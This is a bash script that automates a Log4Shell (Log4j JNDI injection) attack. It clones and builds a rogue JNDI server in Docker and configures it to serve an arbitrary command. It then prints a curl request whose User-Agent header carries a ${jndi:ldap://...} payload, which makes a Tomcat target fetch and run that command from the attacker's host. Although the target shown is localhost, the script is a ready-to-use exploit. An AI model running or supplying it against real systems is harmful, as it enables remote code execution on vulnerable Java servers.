#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "usage : $0 <jndi_server_ip> <jndi_server_port> <cmd>"
    exit 1
fi

LHOST=$1
# jndi server1
LPORT_SERVER=$2
#Â CMD
CMD=$3

NC='\033[0m'
RED='\033[0;31m'
BLUE='\033[0;34m'

# JNDI server build
if [[ -d rogue-jndi ]]
  then
     echo -e "${BLUE}[+] rogue-ndi already exist skipp${NC}"
  else
      echo -e "${BLUE}[+] clone rogue-jndi${NC}"
      git clone git@github.com:Mayfly277/rogue-jndi.git
fi

echo -e "${BLUE}[+] build rogue-jndi${NC}"
sudo docker build . -t rogue-jndi

# JNDI server start to answer jndi call
echo -e "${BLUE}[+] start rogue server on ${LPORT_SERVER} ${NC}"
sudo docker rm -f rogue-jndi1
echo -e "${BLUE}>> sudo docker run -d --rm  --name="rogue-jndi1" -p 0.0.0.0:${LPORT_SERVER}:1389 rogue-jndi --command \"${CMD}\" ${NC}"
sudo docker run --rm  --name="rogue-jndi1" -p 0.0.0.0:${LPORT_SERVER}:1389 rogue-jndi --command "${CMD}"

# exploit
echo -e "${BLUE}[+] to trig the vuln play : ${NC}${RED}curl 127.0.0.1:8081 -H 'User-Agent: \${jndi:ldap://${LHOST}:${LPORT_SERVER}/o=tomcat}'${NC}"
